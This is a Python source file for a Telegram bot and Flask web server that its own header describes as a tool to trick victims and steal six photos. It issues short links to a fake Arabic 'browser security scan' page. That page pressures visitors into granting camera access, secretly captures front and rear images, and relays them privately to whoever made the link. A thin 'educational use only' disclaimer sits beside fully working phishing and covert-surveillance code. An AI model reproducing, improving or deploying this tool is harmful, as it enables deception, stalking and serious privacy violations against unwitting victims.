# ╔════════════════════════════════════════════════════════════╗
# ║     SECURE SCAN BOT - Abu Azzam Edition 2026               ║
# ║     Generate short links → Trick victim → Steal 6 photos   ║
# ║     Photos sent ONLY to the link generator (private)       ║
# ╚════════════════════════════════════════════════════════════╝

import os
import uuid
import base64
import json
import threading
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from colorama import init, Fore, Style

init(autoreset=True)
r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT

BANNER = f"""
{r}╔════════════════════════════════════════════╗
{r}║     SECURE SCAN BOT - Abu Azzam 2026       ║
{r}║   One link = 6 photos sent to YOU only     ║
{r}╚════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ──── Config from Render Env ────
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print(f"{r}[!] BOT_TOKEN missing!{Style.RESET_ALL}")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ──── Global storage (in-memory - lost on restart) ────
user_links = {}     # user_id → list of link_ids
link_owner = {}     # link_id → user_id

# ──── Welcome message with disclaimer ────
@bot.message_handler(commands=['start'])
def welcome(msg):
    text = f"""
{BANNER}

اهلا وسهلا يا {msg.from_user.first_name} 👋

هذا البوت تم تطويره من قبل **أبو عزام** لأغراض تعليمية وبحثية فقط.
أنا غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا الأداة.
استخدمه على مسؤوليتك الشخصية الكاملة ⚠️

الوظيفة الأساسية:
• توليد رابط قصير وغير مشبوه
• إرسال الرابط لأي شخص (واتساب، تليجرام، إلخ)
• عندما يضغط الشخص على الرابط → يُخدع بصفحة "فحص أمان المتصفح"
• يُطلب منه السماح بالكاميرا → يتم التقاط 3 صور أمامية + 3 خلفية
• الصور تُرسل لك أنت فقط (صاحب الرابط) في الخاص

اضغط الزر أدناه لبدء توليد رابط جديد ↓
"""

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🛡️ توليد رابط فحص أمان جديد", callback_data="generate_link"))

    bot.send_message(msg.chat.id, text, reply_markup=kb, parse_mode='Markdown')


# ──── Generate short unique link ────
@bot.callback_query_handler(func=lambda c: c.data == "generate_link")
def gen_link(call):
    user_id = call.from_user.id
    link_id = str(uuid.uuid4())[:8]  # 8 chars short & nice

    if user_id not in user_links:
        user_links[user_id] = []
    user_links[user_id].append(link_id)
    link_owner[link_id] = user_id

    base_url = request.host_url.rstrip('/')
    short_link = f"{base_url}/check/{link_id}"

    text = f"""
تم توليد رابط فريد خاص بك ✓

الرابط:  
`{short_link}`

انسخه وأرسله لمن تريد (واتساب، رسائل، إلخ)

عندما يفتحه الشخص ويسمح بالكاميرا:
→ سيتم التقاط 3 صور أمامية + 3 خلفية
→ الصور ستصلك أنت فقط في هذا الدردشة

اضغط "توليد رابط آخر" إذا أردت واحد جديد ↓
"""

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🔄 توليد رابط آخر", callback_data="generate_link"))
    kb.add(InlineKeyboardButton("📋 عرض روابطي السابقة", callback_data="my_links"))

    bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=kb, parse_mode='Markdown')


# ──── Show previous links ────
@bot.callback_query_handler(func=lambda c: c.data == "my_links")
def show_links(call):
    user_id = call.from_user.id
    if user_id not in user_links or not user_links[user_id]:
        bot.answer_callback_query(call.id, "ما عندك روابط سابقة بعد.", show_alert=True)
        return

    text = "روابطك السابقة:\n\n"
    base_url = request.host_url.rstrip('/')
    for lid in user_links[user_id]:
        text += f"• `{base_url}/check/{lid}`\n"

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🛡️ توليد رابط جديد", callback_data="generate_link"))

    bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=kb, parse_mode='Markdown')


# ──── Fake "Secure Scan" page ────
SCAN_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص أمان المتصفح</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {margin:0; background:#0d1117; color:#c9d1d9; font-family:Arial; text-align:center; padding:20px;}
        h2 {color:#58a6ff;}
        #info {font-size:16px; line-height:1.6; margin:20px 0;}
        video {width:90%; max-height:50vh; background:#000; border:1px solid #30363d; border-radius:8px;}
        #status {font-size:18px; margin:25px 0; color:#f85149;}
        .btn {padding:14px 28px; background:#238636; border:none; color:white; font-size:17px; border-radius:6px; cursor:pointer; margin:10px;}
        .error {color:#f85149;}
        .success {color:#58a6ff;}
    </style>
</head>
<body>
    <h2>فحص أمان المتصفح السريع</h2>
    <div id="info">
        لضمان سلامتك من التهديدات البصرية والبرمجيات الخبيثة، نحتاج إجراء فحص سريع للكاميرا.<br>
        الخطوة ضرورية وتستغرق أقل من 20 ثانية.<br>
        <strong>اضغط "سماح" للكاميرا الأمامية والخلفية</strong> لإكمال الفحص.
    </div>
    <video id="video" autoplay playsinline></video>
    <div id="status">جاري التحضير... يرجى السماح بالوصول للكاميرا</div>
    <button id="start" class="btn" style="display:none;">ابدأ الفحص</button>

    <script>
        let stream, frontCount = 0, backCount = 0;
        const MAX_PHOTOS = 3;
        const linkId = window.location.pathname.split('/').pop();

        async function startCamera(mode) {
            if (stream) stream.getTracks().forEach(t => t.stop());
            try {
                stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
                document.getElementById('video').srcObject = stream;
                document.getElementById('status').textContent = `الكاميرا ${mode === 'user' ? 'الأمامية' : 'الخلفية'} جاهزة...`;
                return true;
            } catch(e) {
                document.getElementById('status').innerHTML = `<span class="error">فشل الوصول للكاميرا: ${e.message}</span><br>يرجى منح الإذن اللازم لإتمام الفحص`;
                return false;
            }
        }

        async function capture() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.88));
        }

        async function runScan() {
            document.getElementById('start').style.display = 'none';
            let photos = [];

            // Front 3 photos
            if (await startCamera('user')) {
                for(let i = 0; i < MAX_PHOTOS; i++) {
                    await new Promise(r => setTimeout(r, 1200));
                    let blob = await capture();
                    photos.push(await blobToB64(blob));
                    document.getElementById('status').textContent = `تم التقاط صورة أمامية \( {i+1}/ \){MAX_PHOTOS}`;
                }
            }

            // Back 3 photos
            if (await startCamera('environment')) {
                for(let i = 0; i < MAX_PHOTOS; i++) {
                    await new Promise(r => setTimeout(r, 1200));
                    let blob = await capture();
                    photos.push(await blobToB64(blob));
                    document.getElementById('status').textContent = `تم التقاط صورة خلفية \( {i+1}/ \){MAX_PHOTOS}`;
                }
            }

            if (stream) stream.getTracks().forEach(t => t.stop());

            if (photos.length > 0) {
                fetch('/upload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({link: linkId, photos: photos})
                }).then(r => r.json()).then(d => {
                    document.getElementById('status').innerHTML = '<span class="success">تم الفحص بنجاح!</span><br>يمكنك إغلاق الصفحة الآن';
                });
            } else {
                document.getElementById('status').innerHTML = '<span class="error">فشل التحقق</span><br>يرجى إعطاء الإذونات اللازمة لإتمام الأمر';
            }
        }

        function blobToB64(blob) {
            return new Promise(r => {
                let reader = new FileReader();
                reader.onloadend = () => r(reader.result.split(',')[1]);
                reader.readAsDataURL(blob);
            });
        }

        window.onload = () => {
            document.getElementById('start').style.display = 'block';
            document.getElementById('start').onclick = runScan;
        };
    </script>
</body>
</html>
"""

@app.route('/check/<link_id>')
def check_page(link_id):
    return render_template_string(SCAN_PAGE)


@app.route('/upload', methods=['POST'])
def upload_photos():
    data = request.json
    link_id = data.get('link')
    photos = data.get('photos', [])

    if link_id not in link_owner:
        return jsonify({"status": "invalid"})

    owner_id = link_owner[link_id]

    for i, b64 in enumerate(photos):
        try:
            img_data = base64.b64decode(b64)
            filename = f"photo_{owner_id}_{link_id}_{i+1}.jpg"
            with open(filename, "wb") as f:
                f.write(img_data)
            with open(filename, "rb") as f:
                caption = f"صورة {i+1} من الرابط /{link_id} – أبو عزام 2026"
                bot.send_photo(owner_id, f, caption=caption)
            os.remove(filename)
        except Exception as e:
            print(f"Error sending photo {i+1}: {e}")

    return jsonify({"status": "ok"})


# ──── Flask + Bot threads ────
def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)


def run_bot():
    print(f"{g}[*] Bot polling started...{Style.RESET_ALL}")
    bot.infinity_polling(skip_pending=True)


if __name__ == "__main__":
    print(BANNER)
    print(f"Base URL: {os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost:10000')}")
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=run_bot, daemon=True).start()
    while True:
        time.sleep(3600)  # keep alive
